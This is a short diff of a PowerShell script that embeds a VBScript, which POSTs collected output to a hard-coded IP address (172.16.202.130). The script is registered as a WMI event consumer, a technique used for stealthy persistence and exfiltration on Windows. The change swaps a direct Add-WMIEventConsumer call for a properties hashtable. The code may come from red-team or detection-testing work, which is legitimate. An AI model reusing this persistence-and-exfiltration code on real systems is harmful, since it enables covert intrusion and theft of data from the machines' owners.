@@ -1,6 +1,4 @@
-﻿$ComputerName = 'localhost'
-
-$script = @"
+﻿$script = @"
 Set objHTTP = CreateObject("Microsoft.XMLHTTP")
 objHTTP.open "POST", "http://172.16.202.130/", False
 
@@ -17,4 +15,7 @@ objHTTP.send outputString
 Set objHTTP = Nothing
 "@
 
-Add-WMIEventConsumer -ComputerName $ComputerName -Name GenericHTTP -ScriptText $script
+$props = @{
+    'Name' = 'GenericHTTPPOST';
+    'ScriptText' = $script;
+}
